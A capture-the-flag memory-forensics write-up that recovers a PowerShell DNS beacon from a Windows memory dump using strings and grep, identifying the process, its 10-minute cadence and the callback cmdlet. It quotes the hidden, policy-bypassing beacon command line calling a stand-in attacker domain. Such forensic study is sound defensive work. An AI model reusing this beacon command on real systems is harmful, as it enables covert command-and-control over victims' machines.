# CTF W6 · Memory — write-up (bonus)

**Evidence:** `ctf_post_tir_20261113.mem` — a full physical-memory snapshot of the
compromised `HAMILTON\lmartens` workstation (~3.95 GB), taken as an ELF core
file (`readelf -h` confirms `Type: CORE`, `Machine: AMD x86-64`, 11 `LOAD`
segments laid out exactly like a QEMU/KVM guest-physical-memory dump — the
classic `0x100000`–`0x7bf00000`, `0x80000000`–`0x100000000` PCI-hole gap, then
`0x100000000`+ layout), i.e. a hypervisor-level `virsh dump --memory-only` of
the Windows guest rather than a Windows-native tool's output.

No Volatility (or any other forensics framework) was installable offline —
`pip install volatility3` fails the same way `pip install python-evtx` did in
the Hunt category (proxy `403 Forbidden`, no matching distribution). Per
`TOOLKIT.md`'s own "quick wins" note for memory dumps, though, `strings` +
`grep` goes a very long way here, because Windows keeps a lot of live
operational data as plain UTF-16LE text in RAM: PowerShell's module-logging
records (the same `Microsoft-Windows-PowerShell/Operational` events seen in
the Logs category) and named-pipe names are both still sitting, verbatim, in
the process heap pages captured by the snapshot.

```
strings -el -n 6 ctf_post_tir_20261113.mem > mem_strings_utf16.txt   # ~58s for ~4GB
```

## Beacon process (100 pts)

**Ask:** what process carried the beacon in memory?

PowerShell's own `ConsoleHost`/module-logging state is cached in memory as
formatted "Operational" log text, headers included:

```
Severity = Informational
Host Name = ConsoleHost
Host Version = 5.1.19041.6456
Host ID = 1fbbfa7f-b5c6-4408-8d51-db41b83d1e2b
Host Application = powershell.exe -w hidden -ep bypass -Command Resolve-DnsName
  7f3a9c.b.cdn-hamilton-sync.test -Type A -ErrorAction SilentlyContinue
...
User = HAMILTON\lmartens
```

That `Host Application` line is the live beacon invocation itself, matching
the exact beacon domain (`7f3a9c.b.cdn-hamilton-sync.test`) already
identified from the pcap in the Network category. Cross-referencing the
PowerShell named-pipe naming convention (`\\.\pipe\PSHost.<ticks>.<PID>.
DefaultAppDomain.powershell`) that PowerShell registers per-process shows
one such pipe at PID **3568** — the same PID the Network write-up correlated
back to the Sysmon log as the process that issued the very first beacon DNS
query. The memory dump also shows ~190 more of these pipes, one new
`powershell.exe` process roughly every 10 minutes (timestamps step by almost
exactly 6×10⁹ ticks = 600s between consecutive entries) — confirming the
beacon isn't one long-lived process but a fresh, short-lived `powershell.exe`
spawned on each 10-minute check-in, exactly as the DNS beacon cadence found
in the pcap implied.

**Flag:** `powershell.exe`

## Beacon command line (100 pts)

**Ask:** recover the beacon command line from memory. Which cmdlet performs
the callback?

Same `Host Application` string as above gives the full command line
verbatim:

```
powershell.exe -w hidden -ep bypass -Command Resolve-DnsName 7f3a9c.b.cdn-hamilton-sync.test -Type A -ErrorAction SilentlyContinue
```

So the "callback" isn't an HTTP beacon (no `Invoke-WebRequest`/
`Invoke-RestMethod` calls use this domain anywhere in memory — those
cmdlets only show up in unrelated cached PowerShell help/module text) —
it's a plain DNS lookup. `Resolve-DnsName` performing an `A` record query
against the victim-ID-prefixed beacon subdomain *is* the callback: the
query itself (and whatever the resolver/attacker-controlled DNS server
encodes in its response) is the full beacon round-trip, matching the
Network category's DNS-beacon findings.

**Flag:** `Resolve-DnsName`

---

Both submitted and accepted on CTFd (200 pts total for the category).
